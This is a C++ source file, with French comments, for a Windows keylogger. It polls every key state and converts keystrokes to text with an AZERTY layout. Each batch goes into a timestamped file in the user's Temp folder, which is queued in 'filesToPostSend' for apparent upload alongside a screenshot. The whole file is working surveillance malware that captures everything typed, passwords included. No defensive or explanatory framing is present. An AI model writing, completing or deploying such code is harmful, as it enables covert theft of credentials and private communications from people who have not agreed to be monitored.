#include "../headers/headers.hpp"

// toAdd : when key 8 is pressed, remove 

using namespace std;

string alphabetMin = "abcdefghijklmnopqrstuvwxyz";
string alphabetCap = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";

string stringedBuffer(vector<char>&buffer) {
    string result;
    for (char i : buffer)result += i;
    buffer.clear();
    return result;
}

void log() {
    vector<char> buffer;
    bool progFini = false;
    bool pressed_keys[256];
    while (!progFini){
        for (int i = 0; i < 256; i++) {pressed_keys[i] = false;}
        while(GetAsyncKeyState(13))Sleep(10);
        while (!pressed_keys[13] && buffer.size() < 1024 && !progFini) {
            for (int key = 0; key < 256; key++) {
                // Correction : Affichage de l'état de la touche courante
                if (GetAsyncKeyState(key) & 0x8000) {
                    pressed_keys[key] = true;
                    continue;
                }
                else if (pressed_keys[key] == true) {
                    pressed_keys[key] = false;
                    if(key == 8 && buffer.size() > 0){
                        buffer.pop_back();
                        continue;
                    }
                    else if(pressed_keys[16]){
                        if (key > 64 && key < 91) {buffer.push_back(alphabetCap[key - 65]);}
                        switch (key) {
                            case 32:
                                buffer.push_back(' ');
                                break;
                            case 48:
                                buffer.push_back('0');
                                break;
                            case 49:
                                buffer.push_back('1');
                                break;
                            case 50 :
                                buffer.push_back('2');
                                break;
                            case 51:
                                buffer.push_back('3');
                                break;
                            case 52 :
                                buffer.push_back('4');
                                break;
                            case 53 :
                                buffer.push_back('5');
                                break;
                            case 54 :
                                buffer.push_back('6');
                                break;
                            case 55 :
                                buffer.push_back('7');
                                break;
                            case 56 :
                                buffer.push_back('8');
                                break;
                            case 57 :
                                buffer.push_back('9');
                                break;
                            case 4 :
                                progFini = true;
                                break;
                        }
                        continue;
                    }
                    else {
                        if (key > 64 && key < 91) {buffer.push_back(alphabetMin[key - 65]);}
                        switch (key) {
                            case 32:
                                buffer.push_back(' ');
                                break;
                            case 48:
                                buffer.push_back('a');
                                break;
                            case 49:
                                buffer.push_back('&');
                                break;
                            case 50 :
                                buffer.push_back('e');
                                break;
                            case 51:
                                buffer.push_back('"');
                                break;
                            case 52 :
                                buffer.push_back('\'');
                                break;
                            case 53 :
                                buffer.push_back('(');
                                break;
                            case 54 :
                                buffer.push_back('-');
                                break;
                            case 55 :
                                buffer.push_back('e');
                                break;
                            case 56 :
                                buffer.push_back('_');
                                break;
                            case 57 :
                                buffer.push_back('c');
                                break;
                            case 4 :
                                progFini = true;
                                break;
                        }
                    }
                }
            }
        }
        string fileName = trouverNomFichierTxt();
        ofstream file(fileName, std::ios::app);
        file << stringedBuffer(buffer);
        *(filesToPostSend.load()) += fileName + '\n';
        recordScreenShot();
    }
}

string trouverNomFichierTxt(){
    /*
    Le nom du fichier sera composé de :
    (nom d'utilisateur -> date -> heure).wav
    */
    const DWORD size = UNLEN + 1;
    char usernameChar[size];
    GetUserNameA(usernameChar, const_cast<LPDWORD>(&size));
    string username = usernameChar;

    time_t now = time(nullptr);
    char buffer[80];
    strftime(buffer, sizeof(buffer), "%Y%m%d%H%M%S", localtime(&now));
    string dateHeure = buffer;
    
    string nomFichier = "C:\\Users\\" + username + "\\AppData\\Local\\Temp\\" + dateHeure + ".txt";
    
    return nomFichier;
}

void afficherNumero(){
    while(true) {
        for (int key=0; key < 256; key++) {
            if (GetAsyncKeyState(key)) {
                cout << key << endl;
            }
        }
    }
}